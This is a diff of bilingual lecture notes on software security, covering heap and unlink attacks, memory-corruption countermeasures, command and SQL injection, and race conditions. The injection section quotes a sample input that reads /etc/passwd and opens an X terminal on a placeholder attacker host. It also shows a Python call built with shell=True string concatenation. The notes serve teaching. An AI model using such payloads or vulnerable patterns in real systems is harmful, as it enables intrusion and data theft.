@@ -168,67 +168,92 @@ Sequences of instructions (gadgets) from library code are **assembled together**
 `strcpy()` function
 ![](../img/Pasted%20image%2020250930192922.png)
 ![](../img/Pasted%20image%2020250930192948.png)
-
-might cause crashes
+- global variables
+- Might cause crashes, when program use the intentionally corrupted data
 
 ##### General heap attacks
-The OS arranges continuously memory chuncks (blocks) to applications
+The OS arranges continuously memory chunks (blocks) to applications, double-linked list 双向链表
 
 *Heap Blocks Headers*
 - size of previous block
 - size of this block
-- flags (e.g. freeflag)
+- flags: prevsize, thissize, freeflag
 - if not in use, pointers to next/previous free block
 
+`freeflag` 为非0值，Allocator分割并重组这段内存，并从free list 中unlink
 `unlink()` do an arbitrary write
+若攻击者通过溢出伪造了空闲块头部的`next/prev`，并让分配器执行`unlink()`，会写入两个指针，到攻击者指定的位置。
+
+locations:
+- Global Offset Table (GOT), link ELF-format binaries, allows arbitrary locations to be called
+- Exit handlers in Unix, return from `main()`
+- Lock pointers or exception handlers stored in the Windows Process Environment Block (PEB)
+- Function pointers, c++ virtual member tables
+
+*Heap Spraying*: string variables manipulated in scripts are allocated in a heap, try and predict locations
 
 ### Out-by-one
 字符串的结束符一个字符
-Integer overflow: 分配二维矩阵没有检查n\*m数值大小是否溢出，结果会是一个小值或者无效值
+Integer overflow: 边界值/用户输入，分配二维矩阵没有检查n\*m数值大小是否溢出，导致内存分配一个小值或者无效值，后续写入形成大规模越界写
+
 ### Type confusion errors
 *Type safety*
-> A programming language, analysis tool or runtime is said to enforce **type safety** if it has a clearly specified typing discipline for data values and it ensures that data values fr types stay within the domain of those during program execution
+> A programming language, analysis tool or runtime is said to enforce **type safety** if it has a clearly specified typing discipline for data values and it ensures that data values for types stay within the domain of those during program execution
 
 C
 - implicit type conversions
-- expllicit type casts
+- explicit type casts
 
-### Memory Corrption Countermeasures
-Give devence indepth taht can protect in case of new attacks, malware, regressions to vulnerable code
-- Tamper detection in software
-- Memory protect in OS and hardware
-- Diversification methods
+### Memory Corruption Countermeasures
+Treat the symptoms: 降低可利用性，限制破坏面
+- special technologies in execution or compilation
+- limit the damage that can be done by attacks
+- uses containment and curtailment 抑制和缩减措施
+
+Treat the cause: 保证代码不包含漏洞
+- ensure that the code does not contain vulnerabilities
+- secure programming through code review
+- security analysis tools to find and fix problems
 
 #### Tamper detection
-Wrap frame with protective layer, canary sits below return address. Attacker overflows atack buffer to hit return address
+Wrap frame with protective layer
+*Canaries* on the stack: place a special data below the vulnerable location (return address) in the stack
+- if a corruption occurs, the canary may be altered
+- compiler do more on insert canary and check integrity
 
-Attackers respond to new protection mechanisms by looking for mulnabilities th those mechanisms
+Attackers respond to new protection mechanisms by looking for vulnerabilities in those mechanisms
+- 探测固定canary，推断伪随机种子，通过另一个漏洞泄露canary
+
+*Control-Flow Integrity*, follows a pre-determined call graph
 
 #### Memory mode protection
-Isolation different processes have different resouces
-Sharing resources are shared between processes, partial isolation
+*Isolation*: different processes have different resources
+*Sharing*: resources are shared between processes, partial isolation
 
 Granularity of protection
-- *Fencs*: separate memory accesses between OS and user code
-- *Base and bounds regiester*: enforce separation between several programs allowing access control on memory ranges
-- *Tagged architecture*: tag on each memory locatoin set access rights to stored word, not supported in modern
-- *Paging*: split program/data into pieces, mapped onto memory separately
+- *Fences*: separate memory accesses between OS and user code
+- *Base and bounds register*: enforce separation between several programs allowing access control on memory ranges
+- *Tagged architecture*: tag on each memory location set access rights to stored word (R, RW, X), not supported in modern
+- *Paging*: split program/data into pieces, mapped onto memory separately, giving isolation between different kinds of memory
+	- Data Execution Prevention: attempt to execute causes page-fault
+keeps code and data separate
 
 #### Diversification
 Make many versions of same program; thwarts general attacks that assume some fixed structure
-*ASLR*: randomising layout suring load time makes it harder to find data or code locations
-- small amounts could be brute force
+*ASLR*: randomising layout during load time makes it harder to find data or code locations, but small amounts of randomness could be brute force
 
 #### Defensive programming
 *Bounds checking*
-- data length
-- array subscripts
+- data length before whiting
+- array subscripts within limits
 - boundary conditions: off-by-one
-- size of inputs
-- dangerous API calls
+- constrains size of inputs
+- dangerous API calls to risky code
+**Shared responsibility**: we may trust the tool-chain or each part of  
+the runtime to implement checks or ensure they are not needed
 
 ![](../img/Pasted%20image%2020251007195427.png)
-
+Code reviews, programmer reasoning are brittle
 *Automated code review*: code checking tools
 - Memory faults
 	- Valgrind: Dynamic runtime vulnerability, 
@@ -236,9 +261,10 @@ Make many versions of same program; thwarts general attacks that assume some fix
 
 ## Injection
 *CWE: Common Weakness Enumeration*
-25 top
-
-**Always check your inputs!**
+CWE-74: Injection: Improper Neutralization of Special Elements in Output used by a Downstream Component
+- CWE-77: Command Injection
+	- CWE-89: SQL Injection
+	- CWE-120: OS Command Injection
 
 Downstream component
 - call to a library function
@@ -248,47 +274,64 @@ Downstream component
 	- web query / web API call
 	- query database
 
-*Trust assumptions*
+*Misplaced trust*
 Programmers make trust assumptions concerning which parts of the system they believe will behave as expected.
+- compiled programs are unreadable
+- web page checks its input, so it has the right format when the form data arrives
+**Always check your inputs!**
 
 ### Command injection
 Programmers often insert **system command** calls in application code, interpreted by a **command shell**
 
-Metadata & meta-characters
+Metadata & meta-characters 元字符/转义字符，元数据表示
 - In-band representation: embeds metadata into the data stream
 - Out-of-band representation: separates metadata from data
 
-separators / delimiters
-escape-sequence: describe additional data
+separators / delimiters: encode one string
+escape-sequence: describe additional data, uses meta-characters to represent the actual data
 
 *Input validation*
 Block lists (characters)
-- reject
-- filter
-- sanitize
+- reject, filter, sanitize
 
-Sub-process: risky as they invoke a **shell** to process the commands
+#### Programming languages
+Sub-process invocation: risky as they invoke a **shell** to process the commands
 - `system()` in C, equivalently to `/bin/sh -c <cmd>`
 - `popen()` executes a command as a sub-process, returning a *pipe* to send or read data
 
+`os.system()`
+```
+attackerhotmail.com < /etc/passwd; export  
+DISPLAY=proxy.attacker.org:0; /usr/X11R7/bin/xterm&; #
+```
+
+`call()` in Python
+```py
+call("cat " + filename, shell=True)
+```
+
 Some attacks exploit differences in meta-characters between languages
 
-environment variables
+#### Environment variables
+Commands are influenced by the *environment variables*
 
-DLL in Windows: search order to PATH environment variables
+通过影响paths，修改加载的lib
+DLL in Windows: searching order ==> PATH environment variables
 Unix use a search path which can be defined/overridden by variables
 	`LD_LIBRARY_PATH`
 	`LD_PRELOAD`
 
-IFS changing CVE-2014-6271
+Inter-field separator (IFS) changing 替换字符串指定值
+CVE-2014-6271
 ### SQL Injection
 Routes
 - GET/POST
-- Cookie
-- 服务器变量（HTTP header）
-- 二次注入
+- Cookies
+- 服务器变量（HTTP headers）
+- 二次注入：注入过程和触发攻击分离，先存储后使用
 
 提取，修改，绕过认证，执行任意命令
+查找更多可注入参数，后端指纹识别，数据库级别提权，提取数据库scheme
 
 Forms of SQL Injection
 - 恒真
@@ -297,35 +340,52 @@ Forms of SQL Injection
 - `;`双语句查询
 - 布尔盲注、时间盲注
 - 数据库存储过程漏洞
+- use alternative encodings
 
 Idea: use static analysis pre-processing to generate a dynamic detection tool:  
 1. Find SQL query-generation points in code  
 2. Build SQL-query model as NDFA which models SQL grammar, transition labels are tokens  
 3. Instrument application to call runtime monitor  
 4. If monitor detects violation of state machine, triggers error, preventing SQL query  
+
+program use stored procedures, for more operations
 #### Defence
-静态分析 动态监测攻击 SQLRand
+**In-band**: use sanitization or filtering to remove banned characters 过滤/转义危险字符，令元字符失去意义
+**Out-of-band**: use a prepared/parameterized query with parameters caved out 驱动层安全替换，避免解析用户输入
+
+静态分析 动态监测攻击 
+*SQLRand*: instruction set randomization to change language dynamically tot use opcodes/keywords, attacker hard to guess
+![](../img/Pasted%20image%2020251216061031.png)
+
 ## Racing
 ### Race conditions
-多进程和多CPU并行，
+Check before use TOCTOU
 ![](../img/Pasted%20image%2020251016193515.png)
-访问文件的时间窗口差
-在检查和open之间对文件修改恶意代码
+检查/访问文件的时间窗口差
+在检查和open之间对文件修改：恶意代码
+- 并行多个进程卡setuid程序时间差
+- slow down system, send job control signals
+- automatically schedule attack: `inofigy` API for monitoring file system
+![](../img/Pasted%20image%2020251216062852.png)
+
 *Unix*
-1. 多次解析相同文件
-2. Permission Races: 文件创建时是`0666`
+1. 多次解析相同文件: 中间如果有变更，就查到不同的文件
+	- using file descriptors
+2. Permission Races: `fopen()`创建文件默认`0666`
 3. Ownership Races
-4. Directory Races
-5. Temporary File Races
-	- `fd = mkstemp(temp);`
+4. Directory Position Races: 攻击者并发修改目录结构
+5. Temporary File Races: 生成名字和创建文件动作分离
+	- `fd = mkstemp(temp);` Atomic创建打开
+
 ### Data Races
-两个或多个线程，访问同一共享变量，多次读写导致非确定性结果
+两个或多个线程，同时访问同一共享变量，其中包括写操作导致非确定性结果
 Atomic memory accesses
 Multi-threaded programs
 
 > A data race occurs when two or more threads access a shared variable:  
 1. (potentially) at the same time, and  
 2. at least one of the accesses is a write
+Heisenbug: 偶发，难以复现
 
 *No out-of-thin-air*
 Write speculation in JAVA
@@ -333,7 +393,7 @@ Write speculation in JAVA
 - Ensuring atomicity: enforce mutual exclusion
 - Using locks: mutual exclusion for shared resources
 
-Dynamic analysis: monitor every access to every memory location and see whether the access might have reces with a previous access from a different thread
+Dynamic analysis: monitor every access to every memory location and see whether the access might have races with a previous access from a different thread
 - *Lockset algoorithm*: every shared variable is protected by at least one lock
 ![](../img/Pasted%20image%2020251021193652.png)
 - Eraser tool
